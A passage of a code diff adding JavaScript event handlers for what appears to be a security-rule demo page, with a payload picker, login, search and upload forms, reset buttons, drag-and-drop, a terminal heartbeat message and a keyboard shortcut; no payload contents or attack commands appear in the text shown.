+    payloadListEl.addEventListener('click', function (e) {
+      var item = e.target.closest('.payload-item');
+      if (!item) return;
+      var idx = parseInt(item.dataset.index, 10);
+      var p = PAYLOADS[idx];
+      fillPayload(p);
+      processSubmission(p.name);
+    });
+
+    document.getElementById('btn-login').addEventListener('click', function () {
+      processSubmission('login');
+    });
+
+    document.getElementById('btn-search').addEventListener('click', function () {
+      processSubmission('search');
+    });
+
+    document.getElementById('btn-upload').addEventListener('click', function () {
+      processSubmission('upload');
+    });
+
+    document.getElementById('btn-login-reset').addEventListener('click', function () {
+      document.getElementById('login-user').value = '';
+      document.getElementById('login-pass').value = '';
+    });
+
+    document.getElementById('btn-search-reset').addEventListener('click', function () {
+      document.getElementById('search-q').value = '';
+    });
+
+    document.getElementById('btn-upload-reset').addEventListener('click', function () {
+      document.getElementById('upload-name').value = '';
+    });
+
+    var uploadZone = document.getElementById('upload-zone');
+    uploadZone.addEventListener('dragover', function (e) {
+      e.preventDefault();
+      uploadZone.classList.add('drag');
+    });
+    uploadZone.addEventListener('dragleave', function () {
+      uploadZone.classList.remove('drag');
+    });
+    uploadZone.addEventListener('drop', function (e) {
+      e.preventDefault();
+      uploadZone.classList.remove('drag');
+      if (e.dataTransfer.files.length) {
+        document.getElementById('upload-name').value = e.dataTransfer.files[0].name;
+        switchTab('upload');
+      }
+    });
+
+    setInterval(function () {
+      term.writeln('\x1b[90m[HB] ingest pipeline ok · 847 rules active\x1b[0m');
+    }, 10000);
+
+    window.addEventListener('resize', function () {
+      fitAddon.fit();
+    });
+
+    document.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
+        if (activeTab === 'login') processSubmission('login');
+        else if (activeTab === 'search') processSubmission('search');
+        else processSubmission('upload');
+      }
+    });
   })();
   </script>
   <div id="deck-nav-root"></div>
